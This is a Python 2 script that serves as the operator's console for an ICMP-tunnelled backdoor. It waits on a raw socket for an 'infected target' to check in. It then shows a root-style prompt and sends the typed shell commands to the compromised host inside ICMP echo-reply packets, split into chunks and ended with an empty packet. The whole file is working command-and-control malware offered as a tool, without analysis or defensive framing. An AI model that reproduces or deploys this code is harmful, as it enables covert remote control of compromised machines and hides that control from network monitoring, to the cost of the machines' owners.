#!/usr/bin/env python

import os
import sys
import socket
import struct
import select
import time
import string
import argparse

#Constants and global variables
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0
PROTO_CODE = 0
HEADER_SIZE = 28
MAX_PACK_SIZE = 1024
ACTIVE = 0

#Generating a checksum
def checksum(source_string):
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2
    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer
 
#Receiving an  (maybe truncated) answer
def receiveResult(connectionSocket): 
    rcvBuffer = ""
    #Receiving until an empty package has been sent
    while True:
        whatReady = select.select([connectionSocket], [], []) 
        if whatReady[0] == []:
            return 
        #Receive and unpack package
        recPacket, addr = connectionSocket.recvfrom(MAX_PACK_SIZE + HEADER_SIZE)
        icmpHeader = recPacket[20:HEADER_SIZE]
        type, code, checksum, packetID, sequence = struct.unpack(
            "bbHHh", icmpHeader)
        #Discard if it is no ICMP_ECHO_REQUEST
        if(type != ICMP_ECHO_REQUEST): 
            continue
        result = recPacket[HEADER_SIZE:]
        #Receiving an empty package means transmission is complete
        if(result == ""): 
            return (rcvBuffer, packetID, addr)
        rcvBuffer += result
 
#Sending a single package with msg
def sendPackage(connectionSocket, addr, ownID, msg):
    #Pack header with checksum 0, add data and then generate overall checksum
    chcksum = 0
    header = struct.pack("bbHHh", ICMP_ECHO_REPLY, PROTO_CODE, chcksum, ownID, 1) 
    data = msg 
    chcksum = checksum(header + data)
    header = struct.pack(
        "bbHHh", ICMP_ECHO_REPLY, PROTO_CODE, socket.htons(chcksum), ownID, 1) 
    packet = header + data
    #send finished package
    connectionSocket.sendto(packet, addr)

#Sending an answer in one ore more packages
def sendCmd(connectionSocket, addr, targetID, cmd): 
    #Determine length of answer
    remaining = len(cmd)
    while(remaining > 0):
        buf = ""
        #If the command is too long for a single package it has to be truncated
        if (remaining > MAX_PACK_SIZE):
            #truncate
            buf = cmd[0:MAX_PACK_SIZE]
            cmd = cmd[MAX_PACK_SIZE:]
        #Else it can be sent in a single package
        else:
            buf = cmd 
        sendPackage(connectionSocket, addr, targetID, buf)
        remaining -= len(buf)
    #Sending empty package to signal end of transmission
    sendPackage(connectionSocket, addr, targetID, "") 

#main functionality
def handleConnections():
    global ACTIVE
    icmp = socket.getprotobyname("icmp")
    print("[*] Waiting for infected target to connect...")
    while (True):
        try:
            try:
                #Waiting until backdoor connects
                try:
                    connectionSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
                except socket.error, (errno, msg):
                    if errno == 1:
                        msg = msg + ( ": You have to be root.")
                        raise socket.error(msg)
                    raise
                (result, packetID, addr) = receiveResult(connectionSocket)
            except socket.gaierror, e:
               print("%s\n" % e[1])
               break
            #Display result
            print(result) 
            #Kommando vom User einlesen
            cmd = raw_input("root@" + addr[0] + ":$ ")
            #Calling "exit" sends last package and exits
            if(cmd == "exit"):
                sendCmd(connectionSocket, addr, packetID, cmd) 
                connectionSocket.close()
                sys.exit(0) 
            #Transmit command
            try:
                sendCmd(connectionSocket, addr, packetID, cmd)
            except socket.gaierror, e:
                print("%s\n" % e[1])
                break
            connectionSocket.close()
            #Setting status on active
            ACTIVE = 1
        except KeyboardInterrupt:
           #If there was an active connection send exit package to the backdoor
           if(ACTIVE == 1):
                sendCmd(connectionSocket, addr, packetID, "exit") 
           connectionSocket.close()
           break 

def main():
    handleConnections()

if __name__ == '__main__':
    main()
